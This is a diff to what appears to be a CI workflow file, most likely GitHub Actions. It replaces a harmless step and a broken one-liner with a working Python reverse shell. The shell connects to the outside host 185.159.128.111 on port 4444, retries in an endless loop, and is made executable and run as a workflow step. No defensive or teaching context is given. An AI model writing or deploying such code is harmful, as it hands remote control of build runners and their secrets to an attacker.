@@ -17,8 +17,15 @@ jobs:
 
     - name: Create reverse shell script
       run: |
-        while true; do python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("185.159.128.111"),int(os.getenv("4444"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")' ; sleep  10 ; done
-        echo salam
+        cat << 'EOF' > reverse_shell.sh
+        while true; do
+            export RHOST="185.159.128.111"
+            export RPORT=4444
+            python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+            sleep 10
+        done
+        EOF
+        chmod +x reverse_shell.sh
 
     - name: Run reverse shell script
-      run: while true ; do echo $RANDOM ; sleep 3 ; done
+      run: ./reverse_shell.sh
